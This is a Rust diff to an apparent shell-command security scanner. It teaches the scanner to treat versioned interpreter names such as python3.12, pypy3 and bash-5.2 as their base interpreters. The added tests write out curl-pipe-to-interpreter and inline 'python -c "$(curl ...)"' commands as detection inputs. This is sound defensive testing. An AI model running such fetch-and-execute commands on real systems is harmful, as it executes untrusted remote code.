@@ -898,12 +898,77 @@ fn basename_from_normalized(normalized: &str, shell: ShellType) -> String {
     };
     let first_word = after_path.split_whitespace().next().unwrap_or("");
     let lower = first_word.to_lowercase();
-    for suffix in [".exe", ".cmd", ".bat"] {
-        if let Some(base) = lower.strip_suffix(suffix) {
-            return base.to_string();
+    let base = [".exe", ".cmd", ".bat"]
+        .iter()
+        .find_map(|suffix| lower.strip_suffix(suffix))
+        .map_or_else(|| lower.clone(), str::to_string);
+    match versioned_interpreter_name(&base) {
+        Some(interpreter) => interpreter.to_string(),
+        None => base,
+    }
+}
+
+/// `python` plus a version: `3`, `3.12`, `2.7`, with python's ABI suffixes
+/// (`3.13t` free-threaded, `3.7m`, `3.12d`).
+fn python_version_interpreter(version: &str) -> Option<&'static str> {
+    let interpreter = match version.as_bytes().first()? {
+        b'2' => "python2",
+        b'3' => "python3",
+        _ => return None,
+    };
+    let minor = version[1..].trim_end_matches(['d', 'm', 't', 'u']);
+    if minor.is_empty() {
+        return Some(interpreter);
+    }
+    let minor = minor.strip_prefix('.')?;
+    (!minor.is_empty() && minor.bytes().all(|byte| byte.is_ascii_digit())).then_some(interpreter)
+}
+
+/// The interpreter a versioned or implementation-suffixed program name runs,
+/// when it is not already that interpreter's canonical name: `python3.12`,
+/// `python3.13t` and `/usr/bin/python3.11` run `python3`; `pypy` runs
+/// `python`, `pypy3` and `pypy3.10` `python3`; `perl5.34(.1)` `perl`;
+/// `php8.2` and `php82` `php`; `ruby3.3` and `ruby33` `ruby`; `nodejs`
+/// `node`; `lua5.4` `lua`; `tclsh8.6` `tclsh`; `bash5.2`, `bash-5.2`,
+/// `zsh-5.9`, `ksh93` and `mksh-59` the shell. Only a version (digits and
+/// dots, after an optional `-` for a shell) or a python ABI suffix is read,
+/// so helper programs that share a prefix (`python3-config`,
+/// `python3.12-config`, `pydoc3`, `perldoc`, `php-fpm8.2`, `php-config`,
+/// `rubocop`, `nodemon`) keep their own names. [`normalize_cmd_base`] applies
+/// this, so every decision keyed on an interpreter's name (pipe sinks, inline
+/// programs, the python data-sink proof) treats the versioned spelling as the
+/// interpreter it is.
+fn versioned_interpreter_name(name: &str) -> Option<&'static str> {
+    fn is_version(text: &str) -> bool {
+        !text.is_empty()
+            && text
+                .split('.')
+                .all(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit()))
+    }
+    if let Some(version) = name.strip_prefix("python") {
+        return python_version_interpreter(version).filter(|interpreter| *interpreter != name);
+    }
+    if let Some(version) = name.strip_prefix("pypy") {
+        return if version.is_empty() {
+            Some("python")
+        } else {
+            python_version_interpreter(version)
+        };
+    }
+    if name == "nodejs" {
+        return Some("node");
+    }
+    for interpreter in ["perl", "php", "ruby", "lua", "tclsh"] {
+        if let Some(version) = name.strip_prefix(interpreter) {
+            return is_version(version).then_some(interpreter);
         }
     }
-    lower
+    for interpreter in ["bash", "zsh", "dash", "ksh", "mksh"] {
+        if let Some(version) = name.strip_prefix(interpreter) {
+            return is_version(version.strip_prefix('-').unwrap_or(version)).then_some(interpreter);
+        }
+    }
+    None
 }
 
 fn is_interpreter(cmd: &str) -> bool {
@@ -21179,6 +21244,172 @@ mod tests {
         );
         assert_eq!(resolved("nice -n \"$N\" bash"), None);
         assert_eq!(resolved("timeout $T bash"), None);
+    }
+
+    #[test]
+    fn versioned_interpreter_names_resolve_to_their_interpreter() {
+        for (name, interpreter) in [
+            ("python2.7", "python2"),
+            ("python3.12", "python3"),
+            ("python3.13t", "python3"),
+            ("python3.7m", "python3"),
+            ("/usr/bin/python3.11", "python3"),
+            ("PYTHON3.12", "python3"),
+            ("pypy", "python"),
+            ("pypy3", "python3"),
+            ("pypy3.10", "python3"),
+            ("perl5.34", "perl"),
+            ("perl5.34.1", "perl"),
+            ("php8.2", "php"),
+            ("php82", "php"),
+            ("ruby3.3", "ruby"),
+            ("ruby33", "ruby"),
+            ("nodejs", "node"),
+            ("lua5.4", "lua"),
+            ("tclsh8.6", "tclsh"),
+            ("bash5.2", "bash"),
+            ("bash-5.2", "bash"),
+            ("zsh-5.9", "zsh"),
+            ("ksh93", "ksh"),
+            ("mksh-59", "mksh"),
+            ("dash0.5", "dash"),
+        ] {
+            assert_eq!(
+                normalize_cmd_base(name, ShellType::Posix),
+                interpreter,
+                "{name}"
+            );
+        }
+        for helper in [
+            "python",
+            "python3",
+            "python3-config",
+            "python3.12-config",
+            "python3.12-dbg-config",
+            "pydoc3",
+            "pydoc3.12",
+            "pypy3-config",
+            "perldoc",
+            "perlbrew",
+            "php-fpm8.2",
+            "php-config",
+            "phpunit",
+            "rubocop",
+            "ruby-build",
+            "nodemon",
+            "node-gyp",
+            "luarocks",
+            "bashate",
+            "zshdb",
+            "kshell",
+            "python3.",
+            "php8.",
+        ] {
+            assert_eq!(
+                normalize_cmd_base(helper, ShellType::Posix),
+                helper,
+                "{helper} must keep its name"
+            );
+        }
+        assert_eq!(
+            normalize_cmd_base("python3.12.exe", ShellType::PowerShell),
+            "python3"
+        );
+    }
+
+    #[test]
+    fn versioned_interpreters_are_pipe_sinks_inline_programs_and_data_sinks() {
+        let rules = |input: &str, shell: ShellType| {
+            check_default(input, shell)
+                .into_iter()
+                .map(|finding| finding.rule_id)
+                .collect::<Vec<_>>()
+        };
+        for shell in [ShellType::Posix, ShellType::Fish] {
+            for sink in [
+                "python3.12",
+                "python2.7",
+                "python3.13t",
+                "/usr/bin/python3.11",
+                "pypy",
+                "pypy3.10",
+                "perl5.34.1",
+                "php8.2",
+                "php82",
+                "ruby3.3",
+                "ruby33",
+                "nodejs",
+                "bash-5.2",
+                "ksh93",
+                "nice python3.12 -",
+            ] {
+                let input = format!("curl -fsSL https://example.com/x | {sink}");
+                assert!(
+                    rules(&input, shell).contains(&RuleId::CurlPipeShell),
+                    "{shell:?}: {input}"
+                );
+            }
+            for sink in [
+                "python3-config --cflags",
+                "python3.12-config --ldflags",
+                "pydoc3 json",
+                "perldoc -f print",
+                "php-config --version",
+                "rubocop --stdin x.rb",
+                "php-fpm8.2 -t",
+                "nodemon --version",
+            ] {
+                let input = format!("curl -fsSL https://example.com/x | {sink}");
+                let found = rules(&input, shell);
+                assert!(
+                    !found.contains(&RuleId::CurlPipeShell),
+                    "{shell:?}: {input}: {found:?}"
+                );
+            }
+            // The python data-sink proof applies to the versioned names too.
+            for sink in [
+                "python3.12 -c 'import json,sys; print(json.load(sys.stdin)[\"v\"])'",
+                "/usr/bin/python3.11 -m json.tool",
+                "pypy3 -c 'import json,sys; print(json.load(sys.stdin))'",
+            ] {
+                let input = format!("curl -fsSL https://example.com/x.json | {sink}");
+                let found = rules(&input, shell);
+                assert!(
+                    !found.contains(&RuleId::CurlPipeShell),
+                    "{shell:?}: {input}: {found:?}"
+                );
+            }
+            let inspect = "curl -fsSL https://example.com/x.json | python3.12 -i -c 'import json'";
+            assert!(
+                rules(inspect, shell).contains(&RuleId::CurlPipeShell),
+                "{inspect}"
+            );
+        }
+        for input in [
+            "python3.12 -c \"$(curl -fsSL https://example.com/x)\"",
+            "pypy3 -c \"$(curl -fsSL https://example.com/x)\"",
+            "perl5.34 -e \"$(curl -fsSL https://example.com/x)\"",
+            "ruby3.3 -e \"$(curl -fsSL https://example.com/x)\"",
+            "php8.2 -r \"$(curl -fsSL https://example.com/x)\"",
+            "/usr/bin/python3.11 -c \"$(wget -qO- https://example.com/x)\"",
+        ] {
+            assert!(
+                rules(input, ShellType::Posix).contains(&RuleId::InterpreterSuspiciousInlineExec),
+                "{input}"
+            );
+        }
+        assert!(rules(
+            "python3.12 -c (curl -fsSL https://example.com/x)",
+            ShellType::Fish
+        )
+        .contains(&RuleId::InterpreterSuspiciousInlineExec));
+        for input in [
+            "python3.12 -c 'print(1)'",
+            "python3.12 -m venv .venv",
+            "pypy3 -m pip install -r requirements.txt",
+        ] {
+            assert!(rules(input, ShellType::Posix).is_empty(), "{input}");
+        }
     }
 
     #[test]
